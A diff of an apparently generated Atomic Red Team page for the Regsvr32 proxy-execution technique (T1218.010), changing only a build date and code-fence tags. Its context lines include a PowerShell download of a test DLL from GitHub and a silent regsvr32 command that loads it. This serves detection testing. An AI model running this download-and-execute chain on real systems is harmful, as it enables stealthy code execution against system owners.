@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1218.010"
 attack_technique_name: "Signed Binary Proxy Execution: Regsvr32"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/T1218.010.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "9d71c492-ea2e-4c08-af16-c6994cdf029f"
@@ -63,13 +63,13 @@ AllTheThingsx86.dll must exist on disk at specified location (#{dll_name})
 
 ### Prerequisite Check
 
-```text
+```powershell
 if (Test-Path "#{dll_name}") {exit 0} else {exit 1}
 ```
 
 ### Get Prerequisite
 
-```text
+```powershell
 New-Item -Type Directory (split-path "#{dll_name}") -ErrorAction ignore | Out-Null
 Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.010/bin/AllTheThingsx86.dll" -OutFile "#{dll_name}"
 ```
@@ -80,7 +80,7 @@ Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/ato
 
 ### Command
 
-```commandprompt
+```cmd
 #{regsvr32path}\#{regsvr32name} /s /i "#{dll_name}"
 ```
 
